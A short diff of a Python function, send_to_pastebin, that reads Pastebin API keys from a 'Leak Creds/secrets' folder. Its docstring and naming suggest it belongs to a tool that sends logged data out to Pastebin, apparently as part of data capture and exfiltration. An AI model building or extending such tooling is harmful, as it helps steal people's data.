@@ -57,7 +57,7 @@ def send_to_pastebin():
     """Send logged data to Pastebin."""
     try:
         # Read the dev key
-        with open(os.path.join("secrets", "dev_key"), 'r') as f:
+        with open(os.path.join("Leak Creds", "secrets", "dev_key"), 'r') as f:
             key = f.read().strip()
     except FileNotFoundError:
         print("Dev key not found")
@@ -65,7 +65,7 @@ def send_to_pastebin():
 
     try:
         # Read the user key
-        with open(os.path.join("secrets", "user_key"), 'r') as f:
+        with open(os.path.join("Leak Creds", "secrets", "user_key"), 'r') as f:
             user_key = f.read().strip()
     except FileNotFoundError:
         print("User key not found")
